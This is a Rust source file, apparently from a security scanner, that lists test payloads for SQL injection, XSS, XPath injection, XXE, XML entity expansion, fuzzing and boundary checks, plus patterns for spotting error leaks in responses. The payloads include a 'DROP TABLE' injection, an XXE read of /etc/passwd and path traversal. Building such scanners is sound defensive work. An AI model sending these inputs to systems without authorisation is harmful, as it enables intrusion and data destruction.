use super::types::ScanType;

pub fn get_payloads(scan_type: &ScanType) -> Vec<String> {
    match scan_type {
        ScanType::SqlInjection => vec![
            "' OR '1'='1".into(),
            "'; DROP TABLE users;--".into(),
            "1' OR '1'='1' --".into(),
            "admin'--".into(),
            "1; SELECT * FROM users".into(),
            "' UNION SELECT NULL--".into(),
            "1' AND '1'='1".into(),
            "' OR 1=1#".into(),
            "'; WAITFOR DELAY '0:0:5'--".into(),
            "1' ORDER BY 1--".into(),
        ],
        ScanType::XssInjection => vec![
            "<script>alert('XSS')</script>".into(),
            "<img src=x onerror=alert('XSS')>".into(),
            "javascript:alert('XSS')".into(),
            "<svg onload=alert('XSS')>".into(),
            "'\"><script>alert('XSS')</script>".into(),
            "<body onload=alert('XSS')>".into(),
            "<iframe src=\"javascript:alert('XSS')\">".into(),
            "{{constructor.constructor('alert(1)')()}}".into(),
        ],
        ScanType::XPathInjection => vec![
            "' or '1'='1".into(),
            "' or ''='".into(),
            "x' or name()='username' or 'x'='y".into(),
            "admin' or '1'='1".into(),
            "'] | //user/*[contains(*,'".into(),
        ],
        ScanType::MalformedXml => vec![
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>".into(),
            "<?xml version=\"1.0\"?><root><unclosed>".into(),
            "<root><![CDATA[test]]></root>".into(),
            "<?xml version=\"1.0\" encoding=\"invalid\"?>".into(),
        ],
        ScanType::XmlBomb => vec![
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>".into(),
        ],
        ScanType::FuzzingScan => vec![
            "".into(),
            " ".into(),
            "null".into(),
            "undefined".into(),
            "NaN".into(),
            "0".into(),
            "-1".into(),
            "999999999999999999999".into(),
            "true".into(),
            "false".into(),
            "[]".into(),
            "{}".into(),
            "../../../etc/passwd".into(),
            "%00".into(),
            "%0d%0a".into(),
            "\r\n".into(),
            "\n".into(),
            "\t".into(),
        ],
        ScanType::BoundaryScan => vec![
            "".into(),
            "a".into(),
            "a".repeat(255),
            "a".repeat(256),
            "a".repeat(1000),
            "0".into(),
            "-1".into(),
            "2147483647".into(),
            "-2147483648".into(),
            "9223372036854775807".into(),
        ],
        ScanType::InvalidTypes => vec![
            "string_instead_of_number".into(),
            "123abc".into(),
            "true".into(),
            "null".into(),
            "[]".into(),
            "{}".into(),
            "1.1.1".into(),
            "2024-13-45".into(),
            "not-a-uuid".into(),
            "invalid@email".into(),
        ],
    }
}

// Leak patterns to detect in responses
pub fn get_leak_patterns(scan_type: &ScanType) -> Vec<&'static str> {
    match scan_type {
        ScanType::SqlInjection => vec![
            "sql syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "ODBC",
            "syntax error",
            "unclosed quotation",
            "quoted string not properly terminated",
        ],
        ScanType::XssInjection => vec![
            "<script>",
            "javascript:",
            "onerror=",
            "onload=",
        ],
        ScanType::XPathInjection => vec![
            "XPath",
            "xpath",
            "XPATH",
            "SimpleXMLElement",
        ],
        ScanType::MalformedXml | ScanType::XmlBomb => vec![
            "XML",
            "parser error",
            "DOCTYPE",
            "ENTITY",
        ],
        _ => vec![],
    }
}
